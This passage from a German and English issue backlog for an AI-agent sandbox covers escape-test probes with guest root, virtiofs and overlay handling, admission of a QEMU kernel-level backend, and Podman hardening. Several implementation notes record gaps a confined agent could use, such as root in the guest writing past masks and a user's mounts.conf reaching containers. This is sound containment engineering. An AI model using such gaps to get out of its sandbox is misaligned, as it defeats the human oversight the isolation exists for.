- Ein Signal an QEMU beendet die VM, es unterbricht nicht den Agenten (Interrupt über HUM-443).

## HUM-445 · Escape-Suite der Kernel-Stufe: Proben mit Gast-Root, CI-Job mit KVM

### Kontext
Die Kernel-Stufe ist erst zulässig, wenn die ganze Suite gegen sie grün ist und Proben belegen, dass Root im Gast nichts außer der Tür erreicht.

### Spezifikation
1. `HUMANITL_ESCAPE_BACKEND=qemu` über `detect_unadmitted`; alle Proben laufen, auch die Mounttabellen-Probe aus HUM-437.
2. Neue Proben aus dem Gast als Root und ohne seccomp (nur im Testprofil, nie wählbar außerhalb der Suite): andere vsock-Ports und CIDs nicht erreichbar, auch nicht ein zweiter, lauschender Gast einer anderen Sitzung (Q9), nur `lo`, `connect` nach außen scheitert, `finit_module` scheitert; auf dem Host: Netz-Namensraum der Prozesse der Unit nur `lo`.
3. CI-Job `escape-tests-qemu`, aufgebaut auf `kvm-tests` aus HUM-465; Pfadregeln nach HUM-424.

### Tests
- Die Suite; Mutationsbeweise je neuer Probe (zusätzliches Netzgerät, zweiter Lauscher, Modulsperre aus), im Commit-Body mit Lauf-ID.

### Akzeptanzkriterien
1. `escape-tests-qemu` grün in der CI, keine Probe übersprungen, die bwrap grün hat. Bietet kein gehosteter Runner `/dev/kvm`, stoppt das Issue und geht mit Vorschlägen für einen Ersatz an den Inhaber; die Stufe bleibt bis dahin nicht zugelassen.
2. Das Testprofil ohne seccomp ist nur von der Suite ladbar (`SocketFloor`-Muster: Argument im Code, kein Schlüssel).

### Fallstricke
- Proben auf nicht vorhandene vsock-Ziele warten bis zum Timeout (HUM-442); die Probe setzt ein kurzes `SO_VM_SOCKETS_CONNECT_TIMEOUT`, damit der Job nicht wartet.

## HUM-446 · Kernel-Stufe: Projektordner und Wegwerf-Schicht über virtiofs

### Kontext
`/work` kommt über virtiofs in den Gast. Inodes reichen durch, Gerätenummern nicht (HUM-442, Q5). Die Wegwerf-Schicht braucht dieselbe Semantik wie HUM-350, mit dem Inhalt der Schicht als Daten des Angreifers.

### Spezifikation
1. Pinning: virtiofsd für `/work` bekommt den geprüften Ordner per `--bind-fd` (Q4); im Gast vergleicht der Shim den Inode des Einhängens mit dem Plan; auf dem Host prüft der Daemon, dass der virtiofsd-Prozess das geöffnete Verzeichnis hält.
2. Wegwerf: eine obere Schicht als eigenes Verzeichnis der Sitzung über einen dritten virtiofsd, im Gast ein overlay aus dem nur lesbaren `/work` und dieser Schicht (`overlay` vom Shim vor der Modulsperre geladen); der Daemon liest die Schicht erst nach dem Ende der VM, mit dem vorhandenen Scan; die Masken gelten wie überall.
3. `sandbox.mode`-Regeln aus HUM-357 unverändert (`SANDBOX_030`, `SANDBOX_033`).

### Tests
- Integration unter KVM: Tauschtest aus HUM-437 gegen `qemu`; ESC-5 Wegwerf-Lauf gegen `qemu`.
- Mutationsbeweis: Pfad statt `--bind-fd` färbt den Tauschtest rot.

### Akzeptanzkriterien
1. Kein Agent startet in einem nicht geprüften Ordner; ein Wegwerf-Lauf schreibt nie ins Projekt.
2. `docs/THREAT-MODEL.md` K-Eintrag für virtiofs.

### Fallstricke
- Mit Root im Gast ist jede Datei der Schicht vom Angreifer geschrieben, auch Whiteouts und Rechte; der Scan bleibt so streng wie unter bwrap.
- Bis zu diesem Issue prüft der ESC-5-Test `a_disposable_sandbox_never_writes_to_the_project` unter der Kernel-Stufe nur die Verweigerung (`SANDBOX_030`, HUM-445); dieses Issue macht daraus einen echten Wegwerf-Lauf.

### Stand nach der Umsetzung (2026-11-14)

**Was schon da war.** Punkt 1 war zu zwei Dritteln gebaut: Der virtiofsd für `/work` bekam den geprüften Ordner schon per `--bind-fd 4 /share` (HUM-444), und der Shim verglich den Inode des Einhängens mit dem Plan (`tag:work:<ino>` und ein Pin mit `"dev":"*"`, HUM-465). Der Gastplan kannte schon `modules` für weitere Module vor der Sperre. Es fehlte die Prüfung auf dem Host.

**Pinning auf dem Host.** Die Host-Prüfung (`qemu/host_check.rs`, `shares_held`) liest je Prozess der Unit Ziel, Gerät und Inode jedes Deskriptors und verlangt je geprüftem Ordner genau einen virtiofsd, der ihn unter seinem `--shared-dir` teilt und einen Deskriptor hält, dessen Ziel in seinem Gefängnis dieser `--shared-dir` ist und der Gerät und Inode des Plans trägt (`SANDBOX_047`, Garantie 2). Den geprüften Ordner nur irgendwo darunter zu halten genügt nicht. `UnitStop` trägt dafür die Liste `shares`.

**Wegwerf-Schicht.** `disposable_support` verlangt ein beschreibbares Projekt, das Modul `overlay` im Modulverzeichnis des Gastkernels (Datei oder `modules.builtin`) und ein Laufzeitverzeichnis auf tmpfs. Der Plan öffnet das Verzeichnis der Schicht (`upper` und `work` darin, `qemu/disposable.rs`) und reicht es als Deskriptor 6 an einen dritten virtiofsd (`--bind-fd 6 /layer`, `--xattr`, dieselbe Unit, dasselbe Gefängnis, `LimitNOFILE`); die Maschine bekommt ein drittes Gerät mit dem Tag `layer`. Der virtiofsd für `/work` läuft mit `--readonly`, und `ReadWritePaths` nennt die Schicht statt des Projekts. Im Gast lädt der Shim `overlay` vor der Modulsperre und baut `/work` (`guest_overlay.rs`): ein kleines tmpfs als Bühne, darauf das Projekt nur lesbar mit Vergleich seines Inodes, die Schicht, das Overlay mit `userxattr,redirect_dir=nofollow,metacopy=off,index=off`, dann `open_tree` des Overlays, die Bühne mit `MNT_DETACH` weg und die Kopie mit `move_mount` auf `/work`. Die Mounttabelle erwartet an `/work` genau ein `overlay`. `ensure_ended` fragt bei einer Unit zusätzlich den Dienstverwalter, ob noch ein Prozess lebt (`cgroup.events`).

**Gemessen.** Ohne Fähigkeit scheitert das Overlay im Gast mit `EACCES`: Es legt sein Arbeitsverzeichnis `work/work` mit den Rechten 0000 an und prüft darin `RENAME_WHITEOUT`, und der virtiofsd schreibt als einfacher Nutzer. Der virtiofsd der Schicht bekommt deshalb `--cap-add CAP_DAC_OVERRIDE`, nur in seinem eigenen Nutzer-Namensraum; danach laufen Whiteouts, opake Verzeichnisse (`user.overlay.opaque` über `--xattr`) und Kopien nach oben mit dem Gastkernel der CI (Debian 6.12) und dem lokalen (7.3.4). Der Gastkernel meldet `upper fs does not support tmpfile`; das kostet nichts. Debians virtiofsd 1.14 kennt `--bind-fd` nicht selbst, das Pinning trägt bwraps `--bind-fd` im Gefängnis wie in HUM-442 Q4.

**Masken.** Unter bwrap liegen die Masken über dem Overlay; hier liegen sie in der unteren Schicht (im Gefängnis des Projekt-Dienstes), und Root im Gast kann die Schicht an ihnen vorbei beschreiben. Der Scan bleibt so streng wie unter bwrap, indem er jede Änderung auf, unter oder über einer Maske ablehnt (`scan_masked`, die Masken aus `clone_masks` in der Schicht). Das gilt für jede Wegwerf-Sitzung unter Linux, auch unter bwrap, wo es bisher nur für nicht vorhandene Masken einen Unterschied macht: ein Hook unter einem `.git/hooks`, das es beim Start nicht gab, wird nicht mehr übernommen.

**Tests und Mutationsbeweise.** KVM: `a_folder_swapped_after_the_plan_stays_the_checked_folder` (Tauschtest aus HUM-437 gegen `qemu`) und `a_disposable_session_never_writes_to_the_project`; ESC-5 `a_disposable_sandbox_never_writes_to_the_project` läuft unter `qemu` als echter Wegwerf-Lauf mit Scan und Übernahme. Pfad statt `--bind-fd` färbt den Tauschtest rot (`SANDBOX_042`, `mounts_pinned`); ein Plan mit anderem Inode für die Freigabe färbt die Host-Prüfung im Tauschtest rot; der Gastplan ohne `disposable` färbt den Wegwerf-Lauf rot; `overlay_masks` in `is_mask` übergangen und `overlay_above_mask` in `whiteout` übergangen färben `nothing_on_under_or_above_a_mask_of_the_overlay_is_ever_applied` rot.

**Offen.** Im Gast kann der Agent über einen maskierten Pfad in seiner eigenen Schicht schreiben, unter bwrap verweigert das die Maske selbst; übernommen wird es nie. Kandidat: die Masken zusätzlich im Gast über das Overlay legen, damit die Sicht des Agenten gleich ist. Kandidat: `--xattrmap`, damit der Dienst der Schicht nur `user.overlay.*` annimmt. Aus dem Review: Masken auf einem Projektordner mit Casefold (ext4 `+F`) falten oder ihn im Wegwerf-Modus verweigern; `Layer::open_upper` unter Linux mit Gerät und Inode der oberen Schicht absichern, damit ein vom Gast getauschtes `upper` als `SANDBOX_031` statt als Lesefehler erscheint. Hinweis für die App: Ein `git init` im Wegwerf-Lauf erzeugt abgelehnte Änderungen unter `.git`, und eine Auswahl mit einer abgelehnten Änderung schreibt nichts; „alles übernehmen" muss abgelehnte Einträge auslassen.

## HUM-449 · Kernel-Stufe zulassen: `qemu` wird wählbar

### Kontext
Gegenstück zu HUM-448 für die Kernel-Stufe.

### Spezifikation
1. Voraussetzung, im Commit-Body mit Lauf-ID belegt: `escape-tests-qemu` grün auf `main` mit HUM-446 und den Proben mit Gast-Root aus HUM-445.
2. `ADMITTED_BACKENDS` bekommt `qemu`.
3. `docs/SECURITY.md` Abschnitt der Kernel-Stufe verliert den Hinweis „noch nicht zugelassen"; `docs/THREAT-MODEL.md` setzt die K-Einträge für VMM, vsock-Tür, Steuerkanal, Gastkernel und virtiofs auf `mitigated` mit ihren Proben.

### Tests
- Der Zulassungstest erwartet `qemu` in der Liste; `sandbox.min_isolation = "kernel"` mit `backend = "qemu"` startet (mit Attrappe).

### Akzeptanzkriterien
1. `humanitl run --backend qemu` startet eine Sitzung mit eigenem Kernel.
2. Der Commit ändert keine Zeile außerhalb der Zulassungsliste, ihrer Tests und der zwei Sicherheitsdokumente.

### Fallstricke
- Ohne die Pakete auf dem Rechner bleibt `qemu` mit `SANDBOX_045` nicht verfügbar; das ist kein Fehler der Zulassung.

### Stand nach der Umsetzung (2026-11-15)

**Nachweis (Punkt 1).** Zehn Läufe hintereinander auf `main`, in denen
`kvm-tests` und `escape-tests-qemu` beide liefen und grün waren, nach der
Regel bei HUM-471: 43624997550 (HUM-471), 43630993303 (HUM-476), 43638237420
(HUM-446), 43641769840 (HUM-467), 43646599744 (HUM-468), 43648968241
(HUM-478), 43656202366 (HUM-485), 43661904978 (HUM-484), 43669712307
(HUM-483), 43673927540 (HUM-482). HUM-446 und die Proben mit Root im Gast aus
HUM-445 sind darin enthalten.

**Zulassung (Punkt 2).** `ADMITTED_BACKENDS` führt `VM_BACKEND` zwischen der
gemeinsamen Stufe der Engine und Seatbelt. `auto` löst weiter nie darauf auf;
das VM-Backend ist das einzige, das `sandbox.min_isolation = "kernel"`
erfüllt. Fehlt eine Voraussetzung, scheitert jeder Weg mit `SANDBOX_045`,
auch die Vorschau: `Backend::fallback` sucht das VM-Backend wie
`Backend::detect`, weil schon seine Vorschau die gefundenen Module braucht;
ohne das stünde in Vorschau und Schnappschuss ein `SANDBOX_034`, das dem Build
die Stufe abspräche. Damit ist keine Stufe dieses Builds mehr unzugelassen;
`SANDBOX_048` und die Umgehung bleiben für das nächste Backend.

**Tests.** Der Zulassungstest erwartet `qemu` in der Liste und wählt es mit
jeder Untergrenze bis `kernel`, auch wenn das Profil es verlangt (`SANDBOX_036`
hat jetzt den Knopf zu ihm); `auto` bleibt das Backend des Systems. Ohne
Programme im `PATH` scheitern `detect` und `fallback` mit `SANDBOX_045`. Die
KVM-Tests bauen ihr Backend jetzt über `choose_backend` mit
`sandbox.min_isolation = "kernel"` und `Backend::detect`, ohne Umgehung; alle
22 laufen lokal so grün (Kernel der CI), die Escape-Suite gegen `qemu` 168 von
168. Mutationsbeweise: `VM_BACKEND` aus der Liste genommen färbt sieben Tests
der Sandbox-Crate und zwei der CLI rot, der Zweig des VM-Backends in
`Backend::fallback` entfernt einen der Sandbox-Crate und einen der CLI. Mitgezogen, weil sie die
Sperre behaupteten: die Liste der Backends (verfügbar ohne Befund, sonst nur
`SANDBOX_045`), die Gruppe im Doctor (zugelassen, `available` aus der Suche,
kein Probestart ohne Voraussetzung; die Zeilen einer nicht zugelassenen Stufe
prüft ein Test jetzt direkt), CLI (`sandbox argv` mit `qemu` aus Umgebung,
Flag und `config.toml` endet an der Attrappe des Emulators mit `SANDBOX_045`;
`sandbox backends` zeigt `qemu` verfügbar) und IPC (Start, Vorschau und
Ziehen eines Abbilds mit `qemu` aus `config.toml` und als Wunsch beim Start
enden mit `SANDBOX_045`, nie mit `SANDBOX_048`).

**Abnahme (Kriterium 1).** Mit einem Wegwerf-Daemon aus dem ausgelieferten
Bau (ohne Feature der Umgehung, eigene XDG-Verzeichnisse und eigener Socket,
nicht der Daemon des Nutzers) listet `humanitl sandbox backends` `qemu`
verfügbar, und `humanitl run --backend qemu --sandbox-min-isolation kernel
--direct -- sh -c '…'` startet eine Sitzung mit eigenem Kernel: drei grüne
Garantien mit `host: checked; admitted`, im Gast `uname -r` =
`6.12.115+deb13.1-cloud-amd64` (Kernel der CI, Host 7.3.4), die Datei des
Projekts lesbar, eine Datei aus dem Gast im Projekt, Exit-Code 7 durchgereicht.
Mit dem Kernel des Hosts ebenso.

**Dokumente (Punkt 3).** `docs/SECURITY.md` Abschnitt 14 „Admitted since
HUM-449" mit den Lauf-IDs, Abschnitt 13 und das Ziehen unter der Kernel-Stufe
(`SANDBOX_034`, kein Abbild) angepasst, Abschnitt 9 nennt
`escape-tests-qemu` und `kvm-tests`, Zeile im Änderungsprotokoll.
`docs/THREAT-MODEL.md`: K-30 bis K-34 `mitigated` mit den beiden CI-Jobs, K-27
und die Prosa angepasst, Zeile in der Änderungshistorie. Beides auch deutsch.

**Offen.** Der Doctor zeigt für die zugelassene Kernel-Stufe nur noch die erste
fehlende Voraussetzung in `available`, nicht mehr eine Zeile je Voraussetzung
(wie Podman seit HUM-448); `docs/SECURITY.md` sagt das jetzt so. Kandidat: die
Zeilen je Voraussetzung auch nach der Zulassung zeigen, wenn die Suche
scheitert. Für HUM-447 stehen noch auf „nicht zugelassen": die Beschreibung
von `sandbox.backend` und `sandbox.qemu` in `model.rs` mit Schema und
`docs/CONFIG.md`, `docs/cli.md` (en, de), die ADRs 0002, 0010, 0015, 0021,
`tests/escape/README.md`, der Kommentar in `.github/workflows/ci.yml` und der
Fake der App.

## HUM-447 · Doku der Kernel-Stufe, Oberfläche schaltet `qemu` frei

### Kontext
Abschluss der Kernel-Stufe, nach der Zulassung (HUM-449).

### Spezifikation
1. `README.md` (en, de) nennt die Kernel-Stufe; `docs/CONFIG.md`, `docs/cli.md` (en, de), Installationsanleitung mit den Paketen; ADR-0021 Nachtrag „zugelassen" mit Lauf-ID, deutsch und englisch.
2. Oberfläche (HUM-440) zeigt `qemu` mit Stufe `kernel` und den Voraussetzungen aus dem RPC.
3. `.deb`: `qemu-system-x86`, `virtiofsd` und `vhost-device-vsock` nur unter `Suggests`; RPM und AUR entsprechend, soweit paketiert.

### Tests
- Widget: `qemu` wählbar nur mit `available = true`; Golden aktualisiert.
- `lint-docs.sh`, `check-doc-links.py`.

### Akzeptanzkriterien
1. Jede Aussage zur Kernel-Stufe ist durch `escape-tests-qemu` und `docs/SECURITY.md` gedeckt.

### Fallstricke
- Das Tor aus dem Kopf dieses Sprints gilt: `qemu` erscheint in der Oberfläche nicht vor HUM-449.

### Stand nach der Umsetzung (2026-11-15)
README (en, de) mit einem Abschnitt zur Kernel-Stufe; `docs/CONFIG.md` und
das Schema aus den Doc-Strings in `config/src/model.rs` neu erzeugt;
`docs/cli.md` (en, de) mit `--backend qemu`, der Untergrenze und den Zeilen
von doctor je Voraussetzung (HUM-488); Installationsanleitung (en, de) mit
`/dev/kvm`, den drei Paketen und dem Gastkern, samt dem Hinweis, dass
`vhost-device-vsock` in Debian 13 und Ubuntu 24.04 fehlt; Nachträge in
ADR-0021 (zugelassen, mit den zehn Läufen, dem roten Lauf 43678367755 und der
Entscheidung des Owners), ADR-0002, ADR-0010 und ADR-0015, je en und de;
`tests/escape/README.md` und zwei Kommentare in `ci.yml`. App: `qemu` mit der
Stufe `kernel` in der Backend-Wahl, wählbar nur mit `available = true`
(Widget-Tests in `backend_choice_test.dart` und
`sandbox_backend_row_test.dart`, Mutationsbeweise), Goldens neu. Pakete:
`.deb` `Suggests: qemu-system-x86, virtiofsd, vhost-device-vsock`, RPM
`Suggests`, AUR `optdepends`. Kopplung: zwei Zahlen gesunken.

Offen, als Kandidaten: `humanitl run --sandbox-min-isolation` reicht die
Untergrenze nicht an den Daemon (sie fällt still weg; `cli.md` sagt es);
die Einstellungszeile der Backends wird mit vier Segmenten schmal, der Grund
einer fehlenden Voraussetzung läuft über viele Zeilen; Paketnamen für RPM
und AUR ungeprüft.

---

## HUM-450 · `humanitl sandbox argv` withholds hidden values in the CLI too

### Kontext
Beim Review von HUM-429 (2026-11-12) fiel auf: Die Vorschau im Daemon hält
Werte zurück, die der Nutzer verbirgt (`PlanPreview::withhold`), die CLI
`humanitl sandbox argv` druckt unter Linux dagegen die rohen `--setenv`-Werte
in Text und JSON, etwa `sandbox.env.HTTP_PROXY = "http://user:secret@host"`.
Das war schon vor HUM-429 so; die Ausgabe geht nur an den Nutzer selbst,
landet aber in Terminal-Verläufen und geteilten Fehlerberichten.

### Spezifikation
1. `humanitl sandbox argv` wendet dieselbe Entscheidung an wie die Vorschau
   im Daemon (eine Stelle, kein zweiter Filter), in Text und JSON.
2. Ein Schalter `--show-values` zeigt die Werte auf ausdrücklichen Wunsch.

### Tests
- CLI: ein verborgener Wert erscheint in Text und JSON als Platzhalter, mit
  `--show-values` im Klartext. Mutationsbeweis: ohne `withhold` rot.

### Akzeptanzkriterien
1. Kein verborgener Wert erscheint ohne `--show-values` in der Ausgabe.

### Fallstricke
- Der Platzhalter ist derselbe wie im Daemon (`WITHHELD_PLACEHOLDER`).

---

## HUM-451 · A daemon that stops reading the shell door delays neither the lifeline nor the agent

### Kontext
HUM-430 legt die Antworten des Shims an den Daemon (`R`, `E` je weiterer
Shell) in eine begrenzte Warteschlange, die die PID-1-Schleife bei `POLLOUT`
leert; läuft sie über oder ist der Daemon weg, beendet der Shim die
betroffenen Shells. Unit-Tests decken die Schlange ab, ein Integrationstest
mit einem echten Shell-Start fehlt, weil er in der Agent-Sandbox nicht lief
(Review HUM-430, 2026-11-12).

### Spezifikation
1. Ein Integrationstest startet die Sandbox, öffnet über die Tür weitere
   Shells und liest auf der Daemon-Seite nie, bis die Schlange überläuft.
2. Ein zweiter Fall schließt danach die Lebensleine.

### Tests
- Fall 1: die weiteren Shells sind beendet, der Agent läuft weiter.
- Fall 2: der Agent endet binnen `KILL_GRACE` plus 1 s.
- Mutationsbeweis: blockierendes `send` statt Warteschlange lässt Fall 2 rot
  werden.

### Akzeptanzkriterien
1. Beide Fälle laufen in der CI grün.

### Fallstricke
- Der Socket-Puffer muss wirklich voll sein; die Größe hängt am Kernel, also
  so lange öffnen, bis `EAGAIN` beobachtet ist, statt eine Zahl anzunehmen.

---

## HUM-452 · Podman: a container whose client ends unplanned is removed at once

### Kontext
HUM-433 schließt die Lebensleine, sobald `podman run` endet, und der Shim
beendet den Container binnen `KILL_GRACE`. Entfernt wird der beendete
Container aber erst durch ein späteres `kill` der Sitzung oder durch die
Bestandsaufnahme beim nächsten Start des Daemons; der normale Endpfad in
`ipc` ruft kein `terminate` (Bericht des Agenten zu HUM-433, 2026-11-12).
`--rm` gehörte dem beendeten Client und greift nicht mehr.

### Spezifikation
1. Endet der Client einer Podman-Sitzung, ohne dass ein Stopp angefordert
   war, entfernt der Daemon den Container über die Engine, sobald er
   beendet ist, und meldet ein Scheitern als `SANDBOX_041`.

### Tests
- Live (Probe `podman_here`): Client per `SIGKILL` beenden, ohne `kill`
  der Sitzung; nach `KILL_GRACE` plus Frist ist der Container auch in
  `ps --all` weg. Mutationsbeweis: ohne den neuen Aufruf rot.

### Akzeptanzkriterien
1. Nach einem ungeplanten Ende bleibt kein beendeter Container liegen.

### Fallstricke
- Nicht doppelt entfernen, wenn gleichzeitig ein Stopp läuft.

---

## HUM-453 · Podman: the host's `/sys` is hidden in the container, as under bwrap

### Kontext
Der erste Lauf der Escape-Suite gegen Podman (HUM-435, 2026-11-12) war rot
in `esc-2/no_host_sys`: Podman hängt `/sys` des Rechners in jeden Container
nur lesbar ein, bwrap gibt keines. Der Agent sähe unter Podman mehr vom
Rechner als unter bwrap; Podman darf in keiner Hinsicht schwächer isolieren.

### Spezifikation
1. Jede Startzeile des Podman-Adapters legt je ein leeres, nur lesbares tmpfs
   über `/sys` und über Podmans eigenes `/sys/fs/cgroup` darunter; die
   Vorschau zeigt beide als maskiert. Die Grenzen der cgroup gelten weiter.
2. `docs/SECURITY.md` Abschnitt 13 (en, de) nennt es.

### Tests
- Unit: jede Zeile trägt das tmpfs über `/sys`. Mutationsbeweis: ohne den
  Aufruf rot.
- Live: die Podman-Tests bleiben grün; `esc-2/no_host_sys` wird unter
  Podman grün (Lauf in HUM-435).

### Akzeptanzkriterien
1. `esc-2/no_host_sys` ist unter Podman grün.

## HUM-454 · Podman: the user's `mounts.conf` reaches no container

### Kontext
Der erste CI-Lauf von `escape-tests-podman` (HUM-435, 2026-11-12, Podman
4.9.3) war rot in `esc-2/no_engine_secrets` und im Live-Test
`the_users_configuration_does_not_reach_the_container`: Eine
`~/.config/containers/mounts.conf`, die ein Prozess desselben Nutzers anlegt
(THREAT-MODEL K-27), hängt ihre Quellen in jede Sandbox ein. Der Eintrag
`default_mounts_file` in der `containers.conf` des Adapters hält sie nicht
fern, weder unter 4.9.3 noch unter 5.8.6 (Diagnose auf dem Zweig
`hum-435-diag` und lokal): Podman liest die Datei des Nutzers zusätzlich.
Allein das globale Flag `--default-mounts-file` ersetzt die Liste. Eine
`mounts.conf` kann jedes Ziel nennen, ein tmpfs über `/run/secrets` genügt
deshalb nicht. Lokal blieb die Suite grün, weil dort keine solche Datei lag;
der Live-Test prüfte nur den Weg über `CONTAINERS_CONF_OVERRIDE`, den der
Adapter ohnehin entfernt.

### Spezifikation
1. Jede Startzeile des Adapters (`podman run`, der einzige Aufruf, der einen
   Container anlegt) trägt `--default-mounts-file=<leere Datei des Adapters>`
   als globales Flag vor `run`; der Eintrag in der `containers.conf` bleibt
   als zweite Linie.
2. `docs/SECURITY.md` Abschnitt 13 (en, de) nennt das Flag und warum der
   Eintrag in der Konfiguration nicht genügt.

### Tests
- Unit: jeder Befehl des Adapters trägt das Flag vor dem Unterbefehl.
  Mutationsbeweis: ohne das Flag rot.
- Live: `the_users_configuration_does_not_reach_the_container` im CI-Job
  `escape-tests-podman`, nach der gepflanzten `~/.config/containers/mounts.conf`
  des Runners (HUM-435); ein eigenes `HOME` im Test gäbe Podman einen zweiten
  Speicher neben dem `runroot` des Nutzers. Mutationsbeweis: ohne das Flag rot
  (der Lauf vor diesem Issue, 2026-11-12).

### Akzeptanzkriterien
1. `esc-2/no_engine_secrets` und der Live-Test sind unter Podman 4.9 (CI) und
   5.x (lokal) grün.

---

## HUM-455 · CI: the Podman escape suite also runs with an image as the root

### Kontext
HUM-439 macht ein Abbild mit Digest zur möglichen Wurzel der Sandbox. Die
Escape-Suite kann es über `HUMANITL_ESCAPE_IMAGE` nutzen, und lokal liefen
die ESC-2-Fälle damit grün (CA und Bündel vom Host, `/etc/shadow` und
`/etc/machine-id` nicht die des Hosts). Ein CI-Job dafür fehlt, und auf
`debian:trixie-slim` fehlen `python3` und `curl`, so dass 59 Fälle
übersprungen und 4 rot wurden (Review HUM-439, 2026-11-13).

### Spezifikation
1. Der Job `escape-tests-podman` baut aus einem festen Basisabbild ein
   Testabbild mit den Helfern der Suite (`python3`, `curl`, `stat`), nennt es
   per Digest und fährt die Suite ein zweites Mal mit
   `HUMANITL_ESCAPE_IMAGE`.
2. Ziehen und Bauen des Basisabbilds geschehen vor dem Start des Daemons und
   außerhalb jeder Sandbox; der Lauf mit Abbild zieht nichts.

### Tests
- Der zweite Lauf hat keine Fälle, die wegen fehlender Helfer übersprungen
  werden (`ESCAPE_NO_SKIP=1`).

### Akzeptanzkriterien
1. Beide Läufe sind in der CI grün.

---

## HUM-456 · Podman: credentials for a pull come from a file of the adapter

### Kontext
`humanitl sandbox image pull` (HUM-439) lässt die Engine ihre gewohnten
Zugangsdaten lesen, etwa `$XDG_RUNTIME_DIR/containers/auth.json`. Welche
Datei das ist, entscheidet die Engine, nicht Humanitl (Review HUM-439).

### Spezifikation
1. Das Ziehen trägt `--authfile` mit einer Datei, die der Adapter nennt;
   ohne eingerichtete Zugangsdaten zieht es anonym.
2. `docs/cli.md` (en, de) sagt, woher die Zugangsdaten kommen.

### Tests
- Unit: die Zeile des Ziehens trägt das Flag. Mutationsbeweis: ohne rot.

### Akzeptanzkriterien
1. Ein Ziehen liest keine Zugangsdaten außer der genannten Datei.

---

## HUM-457 · A running image pull can be cancelled

### Kontext
Das Ziehen eines Abbilds (HUM-439) läuft bis zu 30 Minuten und lässt sich
weder in der CLI noch in der App abbrechen (Review HUM-439).

### Spezifikation
1. `Ctrl-C` in `humanitl sandbox image pull` und ein Knopf „Abbrechen" in der
   Karte beenden das Ziehen über einen eigenen RPC; der Daemon beendet den
   Prozess der Engine.

### Tests
- Unit mit einer Engine, die nicht antwortet: Abbruch binnen 1 s.

### Akzeptanzkriterien
1. Nach dem Abbruch läuft kein Prozess des Ziehens mehr.

---

## HUM-458 · PID-1 integration tests fail in CI instead of skipping without a usable sandbox

### Kontext
`tests/shim.rs` und `tests/door_backpressure.rs` überspringen still, wenn
bwrap oder Nutzer-Namespaces fehlen. Sperrt ein Runner Namespaces (AppArmor),
wären beide grün, ohne etwas geprüft zu haben (Review HUM-451, 2026-11-13).

### Spezifikation
1. Unter `STRICT=1` (wie in der CI) wird das Überspringen zu einem Fehler mit
   dem Grund.

### Tests
- Mutationsbeweis: ein unbrauchbares `bwrap` auf dem `PATH` mit `STRICT=1`
  macht den Lauf rot.

### Akzeptanzkriterien
1. Kein PID-1-Integrationstest ist in der CI ohne Sandbox grün.

---

## HUM-459 · Constants that tests copy from the shim stay in step with it

### Kontext
`tests/door_backpressure.rs` schreibt `KILL_GRACE`, die Höchstzahl weiterer
Shells und den Wortlaut der Warnung aus dem Shim ab. Ändert sich einer davon,
wird der Test still strenger oder lockerer (Review HUM-451).

### Spezifikation
1. Die Werte kommen aus einer gemeinsamen Quelle, die Shim und Tests lesen,
   oder ein Test vergleicht sie mit dem Shim.

### Tests
- Mutationsbeweis: ein geänderter Wert im Shim macht den Abgleich rot.

### Akzeptanzkriterien
1. Kein Test hält eine eigene Kopie dieser Werte, die unbemerkt abweicht.

---

## HUM-460 · Config: the description of `sandbox.podman` names the admission of Podman

### Kontext
Der Doc-Kommentar der Gruppe `sandbox.podman` in
`daemon/crates/config/src/model.rs` sagt noch, jeder Start mit Podman lehne mit
`SANDBOX_048` ab. Seit HUM-448 ist die gemeinsame Stufe (`crun`) zugelassen;
abgelehnt wird nur noch `krun` bis HUM-449. Der Text steht auch im Schema und
damit in jedem Editor, der es liest (Review HUM-441, 2026-11-13).

### Spezifikation
(Seit HUM-442 fällt `krun` mit HUM-464 ganz weg; dann zieht HUM-464 den Text nach.)

1. Der Doc-Kommentar beschreibt den Stand: `crun` wählbar, `krun` lehnt jeder
   Start bis zur Zulassung der Kernel-Stufe mit `SANDBOX_048` ab.
2. Schema-Fixture und `docs/CONFIG.md` folgen aus der Quelle, nicht von Hand.

### Tests
- Der vorhandene Abgleich von Schema und Fixture bleibt grün.

### Akzeptanzkriterien
1. Kein Text in Konfiguration, Schema oder `docs/CONFIG.md` behauptet, Podman
   sei als Ganzes nicht wählbar.

---

## HUM-461 · RPM and AUR recommend Podman like the .deb

### Kontext
Das .deb nennt seit HUM-441 `podman` und `uidmap` unter `Recommends`. Das RPM
und das AUR-Paket nennen Podman nicht; wer dort das Backend wählt, bekommt nur
die Diagnose von `doctor`.

### Spezifikation
1. RPM: `Recommends: podman` und die Werkzeuge der Unter-IDs als Datei
   (`/usr/bin/newuidmap`), weil sie auf Fedora und openSUSE in verschiedenen
   Paketen stehen. Nie `Requires`: bubblewrap bleibt das einzige Pflicht-Backend.
2. AUR: `podman` unter `optdepends` mit einer Zeile, wofür.

### Tests
- `packaging/rpm` und `packaging/aur` bestehen ihre vorhandenen Prüfungen
  (rpmlint, `check-aur.sh`).

### Akzeptanzkriterien
1. Keines der drei Pakete verlangt Podman; alle drei schlagen es vor.

---

## HUM-462 · Website: Podman as a selectable backend on the security page

### Kontext
Die Sicherheitsseite der Website beschreibt unter Linux nur bubblewrap. Die
Dokumente unter `docs/` erscheinen dort schon mit Podman, die eigenen Texte der
Seite nicht.

### Spezifikation
1. Der erste Schritt von „The journey of one request" (`en.ts`, `de.ts`) nennt
   Podman mit `crun` als wählbares Backend derselben Stufe, mit Verweis auf
   SECURITY.md Abschnitt 13.
2. Die Liste der vertrauten Basis (`Security.astro`, `tcb`) nennt Podman, `crun`
   und `conmon`, wenn das Backend gewählt ist, wie SECURITY.md.

### Tests
- `npm run build` der Website und die vorhandenen Link-Prüfungen grün.

### Akzeptanzkriterien
1. Kein Satz der Seite sagt, Linux kenne nur bubblewrap.

---

## HUM-463 · German translation of ADR-0020 and the German ADR index

### Kontext
ADR-0020 (Podman als Backend) ist seit HUM-441 angenommen, hat aber keine
deutsche Fassung unter `docs/translations/de/adr/`, und der deutsche Index
führt sie nicht.

### Spezifikation
1. `docs/translations/de/adr/0020-podman-sandbox-backend.md` mit dem Kopf, den
   die übrigen Übersetzungen tragen (Quelle und deren Prüfsumme).
2. Der deutsche ADR-Index führt ADR-0020.

### Tests
- `make lint-docs`, die Linkprüfung und die Prüfung der Übersetzungsköpfe grün.

### Akzeptanzkriterien
1. Die deutsche Fassung sagt dasselbe wie das Original, Stand HUM-441.

---

## HUM-466 · Kernel level: writable `/tmp`, `$HOME` and `/run` in the guest

### Kontext
Aus dem Review von HUM-444 (Kandidat). Die Wurzel des Gasts kommt nur lesbar
über virtiofs; die Zeilen des Plans, die unter bwrap ein tmpfs sind (`/tmp`,
